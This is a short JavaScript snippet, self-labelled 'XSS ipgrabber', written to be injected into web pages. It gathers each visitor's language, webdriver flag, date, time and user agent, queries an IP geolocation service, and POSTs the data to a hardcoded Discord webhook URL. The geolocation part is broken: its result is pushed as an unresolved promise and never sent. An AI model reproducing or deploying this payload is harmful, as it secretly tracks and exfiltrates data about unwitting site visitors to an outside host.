async function getData(webhookurl){
    const lang = navigator.language;
    const webdriver = navigator.webdriver;
    const date = new Date().toLocaleDateString();
    const time = new Date().toLocaleTimeString();
    const bDetails=navigator.userAgent;
    const geolocdata = [];
    const fetchGeoLocData = fetch("https://ipapi.co/json/").then(response => geolocdata.push(response.json()));
    console.log(geolocdata);
    const payload={
        "content": "Information",
        "embeds": [
            {
                "title": "New Information about a visitor",
                "color": 12071725,"fields": 
                [
                    {
                        "name":"language", 
                        "value":`${lang}`
                    },
                    {
                        "name":"webdriver",
                        "value":`${webdriver}`
                    },
                    {
                        "name":"Date",
                        "value":`${date}`
                    },
                    {
                        "name":"Time",
                        "value":`${time}`
                    },
                    {
                        "name":"Browser Details",
                        "value":`${bDetails}`
                    },
                ],
                "author": {
                    "name":"XSS ipgrabber"
                }
            }
        ]
    };
    
    fetch(webhookurl,
    {
        method:"POST",
        headers: {
            "Content-Type": "application/json"
        },
        body:JSON.stringify(payload)
    });
}

getData("https://discord.com/api/webhooks/935965829227491428/g1mZjVmSlqVh1ZGJlxXuLc1MV8IC-BlatbirKHqBM-ZOZfdJpIwsLXxfYYl47dKOZe08");